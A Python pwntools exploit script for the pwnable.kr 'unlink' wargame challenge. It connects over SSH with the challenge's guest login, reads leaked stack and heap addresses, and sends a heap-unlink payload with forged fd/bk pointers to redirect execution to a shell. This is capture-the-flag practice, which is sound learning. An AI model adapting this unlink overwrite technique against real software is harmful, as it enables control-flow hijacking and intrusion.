from pwn import *
s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest') ;r = s.process(["./unlink"])
#r = process("./unlink")

r.recvuntil(b"leak: ")
stack_address = int(r.recvline().strip(),16)
r.info("Stack address leak: {}".format(hex(stack_address)))

r.recvuntil(b"leak: ")
heap_address = int(r.recvline().strip(),16)
r.info("Heap address leak: {}".format(hex(heap_address)))

shell_address = 0x080491d6
ebp_minus_8 = stack_address + 12             

#FD = ebp_8 - 4
#BK = A+ 12
#FD->bk = ebp_8 + 4 -4 = BK
#BK->fd = heap_address = ebp_8 - 4
payload = p32(shell_address)                      # A->buf (A + 8)
payload += b"A" * 12                              # A->buf
payload += b"B" * 8                               # B_prevsize, B_size 
payload += p32(ebp_minus_8 - 4)                   # B->fd   (FD)
payload += p32(heap_address + 12)                 # B->bk   (BK)

r.sendline(payload)
r.interactive()
